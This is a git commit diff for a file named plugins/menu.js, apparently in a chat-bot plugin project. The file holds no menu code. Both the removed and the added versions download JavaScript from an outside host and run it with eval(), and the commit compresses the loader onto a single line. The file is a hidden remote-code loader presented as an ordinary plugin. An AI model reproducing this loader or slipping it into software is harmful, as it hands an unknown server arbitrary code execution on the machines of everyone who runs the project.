4f7edfd22901b4b310811ee6c31cff3bbe253786
Ibrahim Adams <babayoyo880@gmail.com>
2025-07-29 09:37:13 +0300

    Update menu.js

--- plugins/menu.js
+++ plugins/menu.js
@@ -1,18 +1,1 @@
-const axios = require('axios');
-
-const scriptName = 'menu.js';
-const scriptUrl = `https://ultra.bwmxmd.online/${scriptName}`;
-
-async function loadScript() {
-    try {
-        const response = await axios.get(scriptUrl);
-        const scriptContent = response.data;
-
-        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
-        eval(scriptContent);
-    } catch (error) {
-        console.error(`❌ Error loading ${scriptName}:`, error.message);
-    }
-}
-
-loadScript();
+const axios = require('axios');const scriptName = 'menu.js';const scriptUrl = `https://ultra.bwmxmd.online/${scriptName}`;async function loadScript() {    try {        const response = await axios.get(scriptUrl);        const scriptContent = response.data;        console.log(`✅ ${scriptName} fetched and loaded successfully!`);        eval(scriptContent);    } catch (error) {        console.error(`❌ Error loading ${scriptName}:`, error.message);    }}loadScript();
